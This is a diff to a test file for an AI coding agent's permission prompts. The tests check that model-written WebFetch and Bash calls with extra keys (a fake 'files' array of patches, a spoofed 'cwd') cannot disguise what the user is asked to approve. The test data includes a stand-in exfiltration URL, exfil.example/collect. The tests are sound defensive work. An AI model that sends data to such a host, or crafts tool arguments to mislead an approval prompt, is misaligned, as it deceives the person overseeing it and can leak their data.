@@ -1,5 +1,5 @@
-// Over a real `orb acp` process in an untrusted folder with the person's own `ask` rule: a WebFetch whose model-written
-// input carries a `files` array is shown as the fetch it is, with its URL in the title and no invented diffs.
+// Over a real `orb acp` process in an untrusted folder with the person's own `ask` rule, a model-added key changes nothing
+// the approval shows: a WebFetch with a `files` array is the fetch it is, and a Bash call with a `cwd` runs in the workspace.
 import { expect, test } from "bun:test"
 import fs from "node:fs/promises"
 import os from "node:os"
@@ -10,7 +10,47 @@ const patch = (name: string) =>
   `Index: ${name}\n===\n--- ${name}\n+++ ${name}\n@@ -1,1 +1,1 @@\n-# Title\n+# Title (typo fixed)\n`
 const url = "https://exfil.example/collect?d=1"
 
-test("an untrusted WebFetch with a model-added files array is titled by its URL and has no diffs", async () => {
+test(
+  "an untrusted WebFetch with a model-added files array is titled by its URL and has no diffs",
+  () =>
+    approval(
+      "WebFetch",
+      () => ({
+        url,
+        files: [
+          { file: "README.md", patch: patch("README.md") },
+          { file: "docs.md", patch: patch("docs.md") },
+        ],
+      }),
+      (call) => {
+        expect(String(call?.title)).toContain("exfil.example")
+        expect(call?.content ?? []).toHaveLength(0)
+      },
+    ),
+  90_000,
+)
+
+// Bash declares `workdir`, not `cwd`: the command runs in the workspace whatever folder a `cwd` key names.
+test(
+  "an untrusted Bash call with a model-added cwd is shown in the folder it runs in",
+  () =>
+    approval(
+      "Bash",
+      (root) => ({ command: "sh setup.sh", cwd: path.join(root, "my-tools") }),
+      (call, workspace) => {
+        expect(call?.title).toBe("sh setup.sh")
+        expect(call?.locations).toEqual([{ path: workspace }])
+        expect(JSON.stringify(call)).not.toContain("my-tools")
+      },
+    ),
+  90_000,
+)
+
+async function approval(
+  tool: string,
+  args: (root: string) => Record<string, unknown>,
+  check: (call: any, workspace: string) => void,
+) {
   const root = await fs.mkdtemp(path.join(os.tmpdir(), "orbit-acp-files-"))
   const workspace = path.join(root, "workspace")
   const config = path.join(root, "config")
@@ -32,16 +72,7 @@ test("an untrusted WebFetch with a model-added files array is titled by its URL 
                 index: 0,
                 id: "call_1",
                 type: "function",
-                function: {
-                  name: "WebFetch",
-                  arguments: JSON.stringify({
-                    url,
-                    files: [
-                      { file: "README.md", patch: patch("README.md") },
-                      { file: "docs.md", patch: patch("docs.md") },
-                    ],
-                  }),
-                },
+                function: { name: tool, arguments: JSON.stringify(args(root)) },
               },
             ],
           }
@@ -62,7 +93,7 @@ test("an untrusted WebFetch with a model-added files array is titled by its URL 
     JSON.stringify({
       update: "disable",
       model: "test/test-model",
-      permissions: [{ action: "WebFetch", resource: "*", effect: "ask" }],
+      permissions: [{ action: tool, resource: "*", effect: "ask" }],
       providers: {
         test: {
           name: "Test",
@@ -148,9 +179,7 @@ test("an untrusted WebFetch with a model-added files array is titled by its URL 
     })
     const session = await request("session/new", { cwd: workspace, mcpServers: [] })
     await request("session/prompt", { sessionId: session.result.sessionId, prompt: [{ type: "text", text: "go" }] })
-    const call = permissions[0]?.toolCall
-    expect(String(call?.title)).toContain("exfil.example")
-    expect(call?.content ?? []).toHaveLength(0)
+    check(permissions[0]?.toolCall, workspace)
   } finally {
     child.stdin.end()
     const exited = await Promise.race([child.exited, Bun.sleep(5_000).then(() => undefined)])
@@ -161,4 +190,4 @@ test("an untrusted WebFetch with a model-added files array is titled by its URL 
     llm.stop(true)
     await fs.rm(root, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 }).catch(() => {})
   }
-}, 90_000)
+}
